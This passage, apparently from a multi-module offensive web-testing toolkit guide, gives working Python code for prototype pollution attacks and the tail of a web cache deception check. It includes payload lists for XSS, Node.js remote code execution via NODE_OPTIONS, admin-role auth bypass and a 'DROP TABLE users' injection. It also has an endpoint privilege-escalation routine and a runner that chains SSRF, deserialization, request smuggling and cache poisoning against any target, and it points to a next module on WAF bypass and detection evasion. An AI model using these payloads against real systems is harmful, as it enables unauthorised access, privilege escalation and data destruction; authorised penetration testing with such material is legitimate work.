            url = f"{self.target}{deception_path}"
            
            # Make authenticated request
            response = self.curl(url)
            
            if response["cached"] and "account" in response["body"].lower():
                return {
                    "type": "Web Cache Deception",
                    "severity": "HIGH",
                    "path": deception_path,
                    "evidence": "Authenticated content cached with static extension"
                }
        
        return None
```

---

## 5. Prototype Pollution

### Prototype Pollution Testing

```python
# prototype_pollution.py
import subprocess
import json
from typing import Dict, List

class PrototypePollution:
    """JavaScript prototype pollution detection and exploitation"""
    
    def __init__(self, target: str, token: str = None):
        self.target = target.rstrip("/")
        self.token = token
        self.findings = []
        
        # Pollution payloads
        self.payloads = {
            "basic": [
                {"__proto__": {"polluted": "yes"}},
                {"constructor": {"prototype": {"polluted": "yes"}}},
                {"__proto__.polluted": "yes"},
            ],
            "xss": [
                {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
                {"__proto__": {"outerHTML": "<script>alert(1)</script>"}},
                {"__proto__": {"srcdoc": "<script>alert(1)</script>"}},
            ],
            "rce_node": [
                {"__proto__": {"shell": "/bin/sh", "NODE_OPTIONS": "--require /proc/self/environ"}},
                {"__proto__": {"argv0": "node", "shell": "/bin/sh"}},
                {"constructor": {"prototype": {"env": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}}},
            ],
            "auth_bypass": [
                {"__proto__": {"isAdmin": True}},
                {"__proto__": {"role": "admin"}},
                {"__proto__": {"authenticated": True}},
                {"__proto__": {"verified": True}},
            ],
            "sql_injection": [
                {"__proto__": {"where": {"1": "1"}}},
                {"__proto__": {"order": [["id; DROP TABLE users; --", "ASC"]]}},
            ]
        }
    
    def curl(self, url: str, method: str = "GET", data: str = None, 
             headers: Dict = None) -> Dict:
        """Make HTTP request"""
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method]
        
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        cmd.extend(["-H", "Content-Type: application/json"])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        if data:
            cmd.extend(["-d", data])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        lines = output.rsplit("\n", 1)
        
        return {
            "body": lines[0] if len(lines) > 1 else "",
            "status": int(lines[-1]) if lines[-1].isdigit() else 0
        }
    
    def test_url_params(self, url: str) -> List[Dict]:
        """Test URL parameters for prototype pollution"""
        findings = []
        
        pollution_params = [
            "__proto__[polluted]=yes",
            "__proto__.polluted=yes",
            "constructor[prototype][polluted]=yes",
            "constructor.prototype.polluted=yes",
            "__proto__[isAdmin]=true",
            "__proto__[role]=admin",
        ]
        
        print(f"[*] Testing URL parameter pollution on {url}")
        
        for param in pollution_params:
            test_url = f"{url}?{param}"
            response = self.curl(test_url)
            
            # Check for pollution indicators
            if "polluted" in response["body"] or response["status"] == 200:
                # Need to verify with follow-up request
                findings.append({
                    "type": "Potential Prototype Pollution (URL)",
                    "severity": "HIGH",
                    "url": test_url,
                    "payload": param
                })
                print(f"[!] Potential pollution: {param}")
        
        return findings
    
    def test_json_body(self, url: str, base_data: Dict = None) -> List[Dict]:
        """Test JSON body for prototype pollution"""
        findings = []
        
        print(f"[*] Testing JSON body pollution on {url}")
        
        for category, payloads in self.payloads.items():
            for payload in payloads:
                test_data = base_data.copy() if base_data else {}
                test_data.update(payload)
                
                response = self.curl(url, "POST", json.dumps(test_data))
                
                # Check for success indicators based on payload category
                success = False
                
                if category == "auth_bypass":
                    if response["status"] == 200 and "admin" in response["body"].lower():
                        success = True
                elif category == "xss":
                    if "alert(1)" in response["body"]:
                        success = True
                elif "polluted" in str(payload):
                    if "polluted" in response["body"]:
                        success = True
                
                if success:
                    finding = {
                        "type": f"Prototype Pollution ({category})",
                        "severity": "CRITICAL" if category in ["rce_node", "auth_bypass"] else "HIGH",
                        "url": url,
                        "payload": payload,
                        "evidence": response["body"][:500]
                    }
                    findings.append(finding)
                    print(f"[!] {category} pollution successful!")
        
        self.findings.extend(findings)
        return findings
    
    def test_merge_endpoints(self, url: str) -> List[Dict]:
        """Test merge/extend/assign endpoints that are common pollution vectors"""
        findings = []
        
        merge_endpoints = [
            "/api/settings",
            "/api/preferences",
            "/api/profile",
            "/api/user/update",
            "/api/config",
        ]
        
        for endpoint in merge_endpoints:
            test_url = f"{self.target}{endpoint}"
            
            for payload in self.payloads["auth_bypass"]:
                response = self.curl(test_url, "POST", json.dumps(payload))
                
                if response["status"] in [200, 201]:
                    # Verify by checking current user
                    verify = self.curl(f"{self.target}/api/user/me")
                    
                    if "admin" in verify["body"].lower():
                        finding = {
                            "type": "Prototype Pollution - Privilege Escalation",
                            "severity": "CRITICAL",
                            "endpoint": endpoint,
                            "payload": payload
                        }
                        findings.append(finding)
                        print(f"[!] Privilege escalation via {endpoint}!")
        
        return findings
```

---

## Integrated Testing Script

```python
# advanced_injection_test.py
"""
Run all advanced injection tests
"""

import sys
import json
from ssrf_exploiter import SSRFExploiter
from deserialization_payloads import DeserializationExploiter
from request_smuggling import RequestSmuggling
from cache_poisoning import CachePoisoning
from prototype_pollution import PrototypePollution

def run_advanced_tests(target: str, token: str = None):
    """Run all advanced injection tests"""
    
    all_findings = []
    
    # Load SSRF candidates from mitmproxy capture
    try:
        with open("/tmp/casperpro/ssrf_candidates.json") as f:
            ssrf_candidates = json.load(f)
    except:
        ssrf_candidates = []
    
    # SSRF Testing
    print("\n" + "="*60)
    print("SSRF TESTING")
    print("="*60)
    
    ssrf = SSRFExploiter(token)
    for candidate in ssrf_candidates[:5]:
        findings = ssrf.test_ssrf(
            candidate["url"], 
            candidate["parameter"],
            candidate["method"]
        )
        all_findings.extend(findings)
    
    # Request Smuggling
    print("\n" + "="*60)
    print("REQUEST SMUGGLING TESTING")
    print("="*60)
    
    smuggling = RequestSmuggling(target)
    all_findings.extend(smuggling.run_all_tests())
    
    # Cache Poisoning
    print("\n" + "="*60)
    print("CACHE POISONING TESTING")
    print("="*60)
    
    cache = CachePoisoning(target, token)
    all_findings.extend(cache.detect_unkeyed_headers())
    all_findings.extend(cache.detect_unkeyed_params())
    
    # Prototype Pollution
    print("\n" + "="*60)
    print("PROTOTYPE POLLUTION TESTING")
    print("="*60)
    
    pollution = PrototypePollution(target, token)
    all_findings.extend(pollution.test_url_params(f"{target}/api/search"))
    all_findings.extend(pollution.test_json_body(f"{target}/api/settings"))
    
    # Save results
    with open("/tmp/casperpro/advanced_injection_findings.json", "w") as f:
        json.dump(all_findings, f, indent=2)
    
    print(f"\n[+] Total findings: {len(all_findings)}")
    print(f"[+] Results saved to /tmp/casperpro/advanced_injection_findings.json")
    
    return all_findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    token = sys.argv[2] if len(sys.argv) > 2 else None
    run_advanced_tests(target, token)
```

---

## Summary

| Attack Type | Detection | Exploitation | Cloud Impact |
|-------------|-----------|--------------|--------------|
| SSRF | mitmproxy addon | AWS/GCP/Azure metadata | Critical - credential theft |
| Deserialization | Signature detection | RCE via gadget chains | Critical - server compromise |
| Request Smuggling | Timing analysis | Cache poisoning, auth bypass | Critical - multi-user impact |
| Cache Poisoning | Header/param reflection | Stored XSS, defacement | High - affects all users |
| Prototype Pollution | JSON body analysis | Auth bypass, RCE | Critical - varies |

---

**Next Module:** casperpro-evasion.md for WAF bypass and detection evasion techniques
